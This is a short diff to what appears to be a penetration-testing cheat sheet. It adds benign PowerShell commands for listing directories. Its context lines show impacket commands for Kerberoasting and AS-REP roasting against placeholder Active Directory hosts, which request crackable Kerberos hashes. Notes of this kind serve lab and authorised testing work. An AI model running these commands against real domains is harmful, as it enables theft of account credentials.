@@ -40,3 +40,12 @@ impacket-GetUserSPNs test.local/john:password123 -dc-ip 10.10.10.1 -request
 impacket-GetNPUsers -no-pass -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst
 impacket-GetNPUsers -no-pass -dc-ip 10.10.10.10 domain.local/ -usersfile users.lst | grep krb5asrep
 ```
+
+## Listing directories in PowerShell
+
+```
+Get-ChildItem . -Force
+dir -Force
+ls -Force
+gci -Force
+```
